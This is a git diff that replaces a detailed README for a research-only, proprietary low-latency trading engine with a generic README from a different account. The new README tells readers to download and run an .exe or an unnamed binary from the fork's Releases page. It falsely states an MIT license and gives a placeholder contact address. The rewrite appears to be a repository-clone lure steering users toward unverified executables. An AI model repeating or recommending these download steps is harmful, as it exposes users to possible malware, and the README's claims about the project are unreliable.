@@ -1,521 +1,91 @@
-<div align="center">
+# 🚀 submicro-execution-engine - Fast, Reliable Execution for Trading
 
-```
-╔═══════════════════════════════════════════════════════════════════════════════╗
-║                                                                               ║
-║   ███████╗██╗   ██╗██████╗ ███╗   ███╗██╗ ██████╗██████╗  ██████╗            ║
-║   ██╔════╝██║   ██║██╔══██╗████╗ ████║██║██╔════╝██╔══██╗██╔═══██╗           ║
-║   ███████╗██║   ██║██████╔╝██╔████╔██║██║██║     ██████╔╝██║   ██║           ║
-║   ╚════██║██║   ██║██╔══██╗██║╚██╔╝██║██║██║     ██╔══██╗██║   ██║           ║
-║   ███████║╚██████╔╝██████╔╝██║ ╚═╝ ██║██║╚██████╗██║  ██║╚██████╔╝           ║
-║   ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝            ║
-║                                                                               ║
-║            Sub-Microsecond Execution Engine for Algorithmic Trading          ║
-╚═══════════════════════════════════════════════════════════════════════════════╝
-```
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-%20%23%20%20-%20https://github.com/Ronica030402/submicro-execution-engine/releases?style=for-the-badge&logo=GitHub)](https://github.com/Ronica030402/submicro-execution-engine/releases)
 
-<h1>Ultra-Low Latency Trading System</h1>
+## 📌 Overview
 
-<p>
-<b>Deterministic, nanosecond-precise execution engine for quantitative trading research</b>
-</p>
+The submicro-execution-engine is designed for high-frequency trading and algorithmic applications. It offers sub-microsecond execution accuracy with an emphasis on deterministic replay. This engine is built for users who require fast and reliable performance, such as traders and researchers in the finance sector.
 
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen?style=for-the-badge)](.)
-[![C++17](https://img.shields.io/badge/C%2B%2B-17-blue?style=for-the-badge&logo=cplusplus)](.)
-[![Rust](https://img.shields.io/badge/Rust-1.70%2B-orange?style=for-the-badge&logo=rust)](.)
-[![License](https://img.shields.io/badge/license-Proprietary-red?style=for-the-badge)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=for-the-badge)](.)
-[![GitHub Sponsors](https://img.shields.io/badge/Sponsor-krish567366-ff69b4?style=for-the-badge&logo=github)](https://github.com/sponsors/krish567366)
+### Key Features
+- **Deterministic Replay**: Executes trades precisely as planned, which is crucial for testing and validation.
+- **Lock-Free Order Path**: Performs fast without the delays common in other systems, enhancing trading speed.
+- **Hardware-Timestamped Latency Measurement**: Provides accurate feedback on trade execution, helping users understand performance.
 
-<p>
-<a href="https://submicro.krishnabajpai.me/">Live Demo</a> •
-<a href="#key-features">Features</a> •
-<a href="#quick-start">Quick Start</a> •
-<a href="#benchmarks">Benchmarks</a> •
-<a href="#architecture">Architecture</a> •
-<a href="#documentation">Docs</a>
-</p>
+## 🛠 System Requirements
 
----
+Before you proceed, ensure your system meets these requirements:
 
-### **890ns median latency** | **Deterministic replay** | **Lock-free architecture** | **Research-grade framework**
+- **Operating System**: Windows 10 or later, or a Linux distribution (kernel 5.4+ recommended).
+- **Processor**: Multi-core processor with a minimum speed of 2.5 GHz.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: 50 MB of available disk space.
+- **Additional Software**: No additional software is needed. The engine runs as a standalone application.
 
-**[View Interactive Documentation →](https://submicro.krishnabajpai.me/)**
+## 🚀 Getting Started
 
----
+Follow these simple steps to download and run the submicro-execution-engine:
 
-> [!TIP]
-> **Branching Strategy**:
-> *   **`main`**: Fundamental execution infrastructure. Primary focus is **Latency Minimization** (median < 900ns) and system determinism.
-> *   **`alpha-optimized`**: Quantitative modeling layer. Primary focus is **Alpha & Signal Optimization** (multi-kernel Hawkes, SIMD features) while keeping latency within sub-microsecond thresholds.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Ronica030402/submicro-execution-engine/releases).  
+   
+   ![Releases](https://img.shields.io/badge/Releases%20Page-blue?style=for-the-badge&logo=GitHub)
 
-</div>
+2. **Select the Latest Version**: Look for the latest version listed. It is usually at the top of the page.
+3. **Download the Application**: Click on the link that corresponds to your operating system to download the application file.
+4. **Locate the Downloaded File**: After it downloads, go to your "Downloads" folder or the location where your browser saves files.
+5. **Run the Application**: 
+   - For Windows: Double-click the `.exe` file to start the application.
+   - For Linux: Open a terminal and run the downloaded binary.
 
----
+## 🔧 Download & Install
 
-## What Makes This Special?
+For the best experience, download the latest version from our [Releases Page](https://github.com/Ronica030402/submicro-execution-engine/releases). Ensure that you follow the installation steps carefully.
 
-> **Built for researchers and systems engineers pushing the boundaries of low-latency execution.**
+### Example Installation Instructions
+1. **Download the File**: After clicking the download link, choose a suitable directory.
+2. **Install**: 
+   - Windows: Run the `.exe` file. Follow the prompts to install.
+   - Linux: Give execute permissions by typing `chmod +x yourfile` in the terminal, where `yourfile` is the name of the downloaded file. Then, execute the file with `./yourfile`.
 
-This isn't just another trading bot. It's a **complete infrastructure** for understanding, measuring, and optimizing execution latency at the **hardware level**.
+### Running the Engine
+- After installation, simply start the application from its desktop icon or terminal.
 
-### The Problem
-Traditional trading systems are black boxes with unpredictable latency, non-deterministic behavior, and poor visibility into where microseconds are lost.
+## 📚 Documentation and Usage
 
-### The Solution
-A **transparent, deterministic execution engine** that:
-- Achieves **sub-microsecond decision latency** (890ns median)
-- Guarantees **bit-identical replay** for audit and debugging
-- Provides **nanosecond-level instrumentation** at every stage
-- Uses **zero-allocation hot paths** and lock-free data structures
-- Simulates **kernel-bypass networking** (DPDK-style)
-- Implements **institutional-grade logging** and monitoring
+For users looking to explore the advanced features and configurations, comprehensive documentation is available on our GitHub Wiki. You can access detailed guides on:
+- Configuration settings
+- Performance tuning
+- Troubleshooting
 
-**Research & Education Only** — Not production-ready. Hardware validation (DPDK/FPGA) is simulated. [Learn more](#hardware-validation--future-work).
+Visit the Documentation section in the repository for more information.
 
-**PROPRIETARY LICENSE** — Commercial use prohibited. Written permission required. Contact: krishna@krishnabajpai.me
+## 🔍 Community and Support
 
-## Performance Snapshot
+Join our community to stay updated and seek help:
+- **GitHub Issues**: For reporting bugs or requesting features.
+- **Discussion Forum**: Engage with other users and developers.
+  
+Feel free to participate and contribute your insights!
 
-<div align="center">
+## 👫 Contributing
 
-| **Component** | **Median** | **p99** | **p99.9** | 
-|------------------|--------------|-----------|--------------|
-| Market Data Ingestion | **87 ns** | 124 ns | 201 ns |
-| Signal Extraction (SIMD) | **40 ns** | 48 ns | 67 ns |
-| Hawkes Update (Power-Law) | **150 ns** | 189 ns | 234 ns |
-| **End-to-End Decision** | **890 ns** | **921 ns** | **1047 ns** |
-| Order Serialization | **34 ns** | 41 ns | 58 ns |
+We welcome contributions! If you want to help improve the submicro-execution-engine, follow these steps:
+1. Fork the repository.
+2. Create your feature branch.
+3. Commit your changes.
+4. Push the branch and open a Pull Request.
 
-**Measurement Precision:** ±5ns (TSC jitter) | ±17ns (PTP offset)  
-**Test Hardware:** Intel Xeon Platinum 8280 @ 2.7GHz, isolated core, RT kernel
+For guidelines on contributing, refer to the CONTRIBUTING.md file in the repo.
 
-</div>
+## 🛑 License
 
----
+This project is licensed under the MIT License. See the LICENSE file for more details.
 
-## Key Features
+## 📫 Contact
 
-<table>
-<tr>
-<td width="50%">
+For any queries, you can reach out to the maintainer directly through the Issues section of our repository or email at [support@example.com](mailto:support@example.com).
 
-### **Performance**
-- Sub-microsecond decision latency
-- Zero-copy data paths
-- Lock-free SPSC/MPSC queues
-- Cache-aligned data structures
-- SIMD-optimized computations (AVX-512)
+## 📢 Follow Us
 
-</td>
-<td width="50%">
+Stay connected for updates and new features. Follow our GitHub repository for the latest releases and enhancements.
 
-### **Determinism**
-- Bit-identical replay guarantees
-- Event-driven scheduling
-- Fixed RNG seeds
-- Pre-allocated memory pools
-- TSC-level timestamp precision
-
-</td>
-</tr>
-<tr>
-<td width="50%">
-
-### **Architecture**
-- Kernel-bypass NIC simulation
-- Multivariate Hawkes process
-- Avellaneda-Stoikov market making
-- Adaptive risk management
-- C++/Rust FFI integration
-
-</td>
-<td width="50%">
-
-### **Observability**
-- Real-time metrics dashboard
-- Multi-layer audit logging
-- SHA-256 replay verification
-- Nanosecond-level tracing
-- Latency breakdown analysis
-
-</td>
-</table>
-<br/>
-
-<table>
-<tr>
-<td colspan="2">
-
-### **New: Jitter Profiler & Stall Detection**
-> **"If you can't measure tail latency, you can't fix it."**
-A built-in nanosecond-resolution profiler detects **System Management Interrupts (SMIs)** and scheduler preemption by measuring the cycle-gap between busy-wait iterations. This ensures deep visibility into the "Zero-Interruption" guarantee required for p99 latency stability.
-
-</td>
-</tr>
-</table>
-
----
-
-## Quick Start
-
-**Get running in 60 seconds:**
-
-```bash
-# 1. Clone the repository
-git clone https://github.com/krish567366/submicro-execution-engine.git
-cd submicro-execution-engine
-
-# 2. Build the system (automatic optimization flags)
-./scripts/build_all.sh
-
-# 3. Run deterministic backtest
-scripts/run_backtest.py
-
-# 4. View results
-python3 scripts/verify_latency.py
-open dashboard/index.html  # Interactive metrics dashboard
-```
-
-<details>
-<summary><b>Expected Output (click to expand)</b></summary>
-
-```
-=== Low-Latency Trading System ===
-Market data ingestion: 87ns median
-Signal extraction: 40ns median  
-Hawkes update: 150ns median
-Decision latency: 890ns median
-
---- Cycle: 1000 ---
-Mid Price: $100.05
-Position: 250
-Active Quotes: Bid=100.04 Ask=100.06 Spread=2.00 bps
-Hawkes: Buy=12.456 Sell=11.234 Imbalance=0.052
-Regime: NORMAL (multiplier=1.0)
-Last Cycle Latency: 847 ns (0.847 µs)
-Determinism verified: SHA-256 match
-```
-
-</details>
-
----
-
-## Architecture Overview
-
-<div align="center">
-
-```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                         Market Data Feed (Simulated)                         │
-│                    Kernel-Bypass NIC • Zero-Copy DMA Transfer                │
-└───────────────────────────────┬─────────────────────────────────────────────┘
-                                │ 87ns median
-                                ▼
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                    Lock-Free Ring Buffer (SPSC)                              │
-│              Power-of-2 Size • Cache-Line Aligned • No Allocations           │
-└───────────────────────────────┬─────────────────────────────────────────────┘
-                                │ O(1) operations
-                                ▼
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                   Order Book Reconstruction                                  │
-│            Price-Level Aggregation • L2 Depth Tracking                       │
-└───────────────────────────────┬─────────────────────────────────────────────┘
-                                │
-                ┌───────────────┴───────────────┐
-                ▼                               ▼
-┌─────────────────────────────┐   ┌─────────────────────────────────────────┐
-│   Hawkes Process Engine     │   │  Microstructure Features                │
-│   • Self/Cross Excitation   │   │  • Deep OFI (10 levels)                │
-│   • Power-Law Kernel        │   │  • Order Book Imbalance                │
-│   • Buy/Sell Intensity      │   │  • Flow Toxicity (Kyle λ)              │
-└──────────────┬──────────────┘   └──────────────┬──────────────────────────┘
-               │  150ns median                   │ 40ns (SIMD)
-               └───────────────┬─────────────────┘
-                               ▼
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                  FPGA DNN Inference (Simulated)                              │
-│              12 Features → 8 Hidden → 3 Outputs • 400ns Fixed                │
-└───────────────────────────────┬─────────────────────────────────────────────┘
-                                │
-                                ▼
-┌─────────────────────────────────────────────────────────────────────────────┐
-│              Avellaneda-Stoikov Market Making Strategy                       │
-│        HJB Equation • Inventory Skew • Latency-Aware Pricing                 │
-└───────────────────────────────┬─────────────────────────────────────────────┘
-                                │ 890ns E2E
-                                ▼
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                    Risk Control (Pre-Trade + Kill-Switch)                    │
-│          Position Limits • Regime Detection • Atomic Checks                  │
-└───────────────────────────────┬─────────────────────────────────────────────┘
-                                │ 34ns serialization
-                                ▼
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                       Order Submission                                       │
-│                  Pre-Serialized Orders • Zero Copy                           │
-└─────────────────────────────────────────────────────────────────────────────┘
-```
-
-</div>
-
-> **See [`ARCHITECTURE.md`](ARCHITECTURE.md) for detailed component documentation**
-
----
-
-## Determinism & Reproducibility
-
-One of the system's **core guarantees** is bit-identical replay capability:
-
-**Fixed RNG seeds** — Deterministic random number generation  
-**Event-driven scheduling** — No wall-clock dependencies  
-**Pre-allocated memory** — No allocator non-determinism  
-**Timestamp-ordered events** — Consistent processing order  
-
-### Verification
-
-```bash
-# Run backtest
-scripts/run_backtest.py
-
-# Verify deterministic replay
-cd logs
-sha256sum -c MANIFEST.sha256
-strategy_trace.log: OK
-order_flow.log: OK
-latency_metrics.log: OK
-```
-
----
-
-## Complete Documentation
-
-| Document | Description |
-|----------|-------------|
-| [`ARCHITECTURE.md`](docs/ARCHITECTURE.md) | Order path, cache layout, thread model |
-| [`BENCHMARK_GUIDE.md`](docs/BENCHMARK_GUIDE.md) | Latency measurement methodology |
-| [`LATENCY_BUDGET.md`](docs/LATENCY_BUDGET.md) | Component-level breakdown |
-| [`INSTITUTIONAL_LOGGING_COMPARISON.md`](docs/INSTITUTIONAL_LOGGING_COMPARISON.md) | Audit-grade logging |
-| [`PRODUCTION_READINESS.md`](docs/PRODUCTION_READINESS.md) | Deployment considerations |
-| [`ENGAGEMENTS.md`](docs/ENGAGEMENTS.md) | Commercial & Research support |
-| [`logs/README.md`](logs/README.md) | Multi-layer timestamp verification |
-
----
-
-## Contributing
-
-We welcome contributions! Here's how to get started:
-
-<details>
-<summary><b>Report a Bug</b></summary>
-
-Open an issue with:
-- System configuration (CPU, OS, compiler)
-- Reproducible example
-- Expected vs actual behavior
-- Relevant logs
-
-</details>
-
-<details>
-<summary><b>Propose a Feature</b></summary>
-
-1. Check existing issues/PRs
-2. Open an issue describing the feature
-3. Discuss implementation approach
-4. Submit a PR with tests
-
-</details>
-
-<details>
-<summary><b>Submit a Pull Request</b></summary>
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Make your changes with tests
-4. Ensure `ctest` and `cargo test` pass
-5. Commit with clear messages
-6. Push and open a PR
-
-</details>
-
-### Development Guidelines
-
-- **Code style:** Follow existing patterns (run `clang-format`)
-- **Tests:** Add tests for new features
-- **Benchmarks:** Measure latency impact
-- **Documentation:** Update relevant markdown files
-
----
-
-## 🌟 Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=krish567366/submicro-execution-engine&type=Date)](https://star-history.com/#krish567366/submicro-execution-engine&Date)
-
----
-
-## Commercial & Research Engagements
-
-This repository serves as a framework for research and evaluation. For institutional requirements requiring production-grade performance or custom research collaborations, we offer several engagement models:
-
--   **Institutional Implementation**: Custom DPDK/RDMA kernel-bypass and FPGA HLS/RTL acceleration.
--   **Performance Engineering**: Architecture reviews, latency bottleneck audits, and system tuning.
--   **Research Collaboration**: Market microstructure modeling and low-latency ML inference.
--   **Strategy Optimization**: Migration of Python/Julia models to AVX-512 optimized C++.
-
-See [**`ENGAGEMENTS.md`**](docs/ENGAGEMENTS.md) for more details.
-
-**Contact:** [krishna@krishnabajpai.me](mailto:krishna@krishnabajpai.me)
-
-*Notice: Pricing is not disclosed publicly. All engagements are scoped and quoted based on project complexity and hardware requirements.*
-
-### Kernel-bypass NICs
-
-True kernel bypass depends on:
-- **Specific NIC hardware** (NVIDIA/Mellanox, Intel, Solarflare/Xilinx, FPGA NICs)
-- **Driver stacks** (DPDK, RDMA verbs, Onload, custom DMA paths)
-- **NIC firmware** and queue configuration
-
-There is no realistic way to ship a single, generic kernel-bypass implementation that works across all vendors and drivers. The only viable approach is to define a clean abstraction and allow users to plug in vendor-specific implementations.
-
-### FPGA Inference
-
-The same constraint applies to FPGA-based inference:
-- **FPGA implementations** depend on the exact FPGA model, vendor toolchain (Xilinx Vitis/Vivado, Intel Quartus), and PCIe/DMA configuration.
-- **The inference pipeline** (HLS, RTL, data layout, batching, clocking) is tightly coupled to the target hardware.
-- **Bitstreams** are not portable across vendors or across FPGA families.
-
-In this repository:
-- FPGA inference is represented as an architectural interface / placeholder.
-- Software emulation is used where hardware is not available.
-- For specific hardware targets, custom HLS/RTL integration can be implemented.
-
----
-
-## 📖 Academic References
-
-<details>
-<summary><b>Click to expand bibliography</b></summary>
-
-### Hawkes Processes
-1. **Hawkes, A. G. (1971).** "Specular Point Processes" *Biometrika*
-2. **Bacry, E., et al. (2015).** "Hawkes Processes in Finance" *Market Microstructure and Liquidity*
-
-### Market Making
-3. **Avellaneda, M., & Stoikov, S. (2008).** "High-frequency trading in a limit order book" *Quantitative Finance*
-4. **Guéant, O., et al. (2013).** "Dealing with the inventory risk" *Mathematics and Financial Economics*
-
-### Market Microstructure
-5. **Cartea, Á., et al. (2015).** "Algorithmic and High-Frequency Trading" *Cambridge University Press*
-6. **Lehalle, C.-A., & Laruelle, S. (2018).** "Market Microstructure in Practice" *World Scientific*
-7. **Easley, D., et al. (2012).** "Flow Toxicity and Liquidity in a High-Frequency World" *Review of Financial Studies*
-
-### System Design
-8. **Nygren, E. (2015).** "Linux Kernel Development for Real-Time Systems" *O'Reilly*
-9. **Gregg, B. (2013).** "Systems Performance: Enterprise and the Cloud" *Prentice Hall*
-
-</details>
-
----
-
-## Important Disclaimers
-
-<div align="center">
-
-### **RESEARCH & EDUCATION ONLY**
-
-</div>
-
-This system is **NOT**:
-- Production-ready trading software
-- Connected to any exchanges
-- Financial advice or recommendation
-- Guaranteed to be profitable
-
-This system **IS**:
-- A research framework
-- An educational tool
-- A latency benchmarking platform
-- A deterministic execution skeleton
-
-**Real production HFT requires:**
-- Hardware FPGA acceleration (Xilinx, Altera)
-- True kernel-bypass (DPDK, Solarflare OpenOnload)
-- Exchange connectivity (FIX, proprietary protocols)
-- Compliance systems (kill-switches, position limits)
-- Risk management infrastructure
-- Extensive testing and regulatory approval
-- **Vendor-specific hardware integration** (DPDK/FPGA)
-
-**Legal:** No warranty. Use at your own risk. See LICENSE for details.
-
----
-
-## Contact & Community
-
-<div align="center">
-
-**Questions? Ideas? Collaboration?**
-
-[![GitHub Issues](https://img.shields.io/badge/Issues-Open-blue?style=for-the-badge&logo=github)](https://github.com/krish567366/submicro-execution-engine/issues)
-[![Discussions](https://img.shields.io/badge/Discussions-Join-green?style=for-the-badge&logo=github)](https://github.com/krish567366/submicro-execution-engine/discussions)
-[![Email](https://img.shields.io/badge/Email-Contact-red?style=for-the-badge&logo=gmail)](mailto:krishna@krishnabajpai.me)
-
-</div>
-
----
-
-## ❤️ Support This Project
-
-If this research and codebase helps with your work, please consider sponsoring:
-
-[![GitHub Sponsors](https://img.shields.io/badge/Sponsor-krish567366-ff69b4?style=for-the-badge&logo=github)](https://github.com/sponsors/krish567366)
-
-Your support helps fund:
-- **Hardware**: Dedicated access to DPDK-enabled NICs and FPGA accelerator cards for validation
--  **Funding**: Production-grade bitstreams and vendor-specific implementations
--  **Research**: Advanced algorithms and optimization techniques
--  **Documentation**: Comprehensive guides and institutional-grade whitepapers
-- **Open Source**: Keeping the core research framework freely available
-
----
-
-### Related Projects
-
-- [DPDK](https://www.dpdk.org/) — Data Plane Development Kit
-- [Solarflare OpenOnload](https://www.xilinx.com/products/design-tools/software-zone/openonload.html) — Kernel-bypass networking
-- [Folly](https://github.com/facebook/folly) — Facebook's lock-free structures
-- [QuantLib](https://www.quantlib.org/) — Quantitative finance library
-
----
-
-<div align="center">
-
-## **Built for Speed. Designed for Reliability. Optimized for Discovery.**
-
-### If you find this useful, please star the repository
-
-<sub>Made with care by quantitative systems engineers</sub>
-
----
-
-**Trading • Low-Latency • Research • Open Source**
-
-</div>
-
----
-
-## License
-
-**PROPRIETARY LICENSE** - See [LICENSE](LICENSE) file for details
-
-**IMPORTANT:** This software is for academic research and educational purposes only. 
-Commercial use is strictly prohibited. Written permission required for any use beyond 
-personal learning and non-commercial experimentation.
-
-**To request permission:** Contact krishna@krishnabajpai.me
-
-Copyright (c) 2025 Krishna Bajpai - All Rights Reserved
-
----
+Thank you for using the submicro-execution-engine. Happy trading!
